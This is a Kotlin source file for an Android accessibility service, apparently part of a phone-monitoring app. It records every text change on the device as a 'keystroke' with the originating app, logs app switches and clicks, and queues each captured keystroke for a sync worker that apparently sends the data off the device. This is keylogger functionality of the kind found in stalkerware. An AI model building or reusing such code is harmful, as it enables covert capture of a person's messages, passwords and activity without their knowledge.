package com.github.muneebwanee.dash.services.accessibility  
  
import android.accessibilityservice.AccessibilityService  
import android.view.accessibility.AccessibilityEvent  
import androidx.work.OneTimeWorkRequestBuilder  
import androidx.work.WorkManager  
import androidx.work.workDataOf  
import com.github.muneebwanee.dash.app.DashApplication  
import com.github.muneebwanee.dash.workers.DataSyncWorker  
import dagger.hilt.android.AndroidEntryPoint  
import kotlinx.coroutines.CoroutineScope  
import kotlinx.coroutines.Dispatchers  
import kotlinx.coroutines.SupervisorJob  
import kotlinx.coroutines.launch  
import timber.log.Timber  
import javax.inject.Inject  
  
@AndroidEntryPoint  
class AccessibilityDataService : AccessibilityService() {  
  
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate)  
  
    @Inject  
    lateinit var accessibilityInteractor: AccessibilityInteractor  
  
    companion object {  
        var isRunningService: Boolean = false  
        private const val NOTIFICATION_ID = 1001  
    }  
  
    override fun onCreate() {  
        super.onCreate()  
        isRunningService = true  
          
        startForegroundServiceWithNotification()  
          
        serviceScope.launch {  
            accessibilityInteractor.initialize()  
        }  
          
        Timber.d("AccessibilityDataService created")  
    }  
  
    override fun onAccessibilityEvent(event: AccessibilityEvent) {  
        when (event.eventType) {  
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {  
                handleTextChanged(event)  
            }  
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {  
                handleWindowStateChanged(event)  
            }  
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {  
                handleViewClicked(event)  
            }  
        }  
    }  
  
    private fun handleTextChanged(event: AccessibilityEvent) {  
        val text = event.text?.toString()  
        if (!text.isNullOrEmpty() && text != "[]") {  
            serviceScope.launch {  
                accessibilityInteractor.logKeystroke(text, event.packageName?.toString())  
                scheduleDataSync("keystroke", text)  
            }  
        }  
    }  
  
    private fun handleWindowStateChanged(event: AccessibilityEvent) {  
        val packageName = event.packageName?.toString()  
        if (!packageName.isNullOrEmpty()) {  
            serviceScope.launch {  
                accessibilityInteractor.logAppUsage(packageName)  
            }  
        }  
    }  
  
    private fun handleViewClicked(event: AccessibilityEvent) {  
        serviceScope.launch {  
            accessibilityInteractor.logUserInteraction(  
                event.packageName?.toString(),  
                event.className?.toString(),  
                "click"  
            )  
        }  
    }  
  
    private fun scheduleDataSync(dataType: String, data: String) {  
        val workRequest = OneTimeWorkRequestBuilder<DataSyncWorker>()  
            .setInputData(  
                workDataOf(  
                    "data_type" to dataType,  
                    "data" to data,  
                    "timestamp" to System.currentTimeMillis()  
                )  
            )  
            .build()  
  
        WorkManager.getInstance(this).enqueue(workRequest)  
    }  
  
    private fun startForegroundServiceWithNotification() {  
        val notification = accessibilityInteractor.createAccessibilityNotification()  
        startForeground(NOTIFICATION_ID, notification)  
    }  
  
    override fun onInterrupt() {  
        Timber.w("AccessibilityDataService interrupted")  
    }  
  
    override fun onDestroy() {  
        super.onDestroy()  
        isRunningService = false  
        serviceScope.cancel()  
        Timber.d("AccessibilityDataService destroyed")  
    }  
}
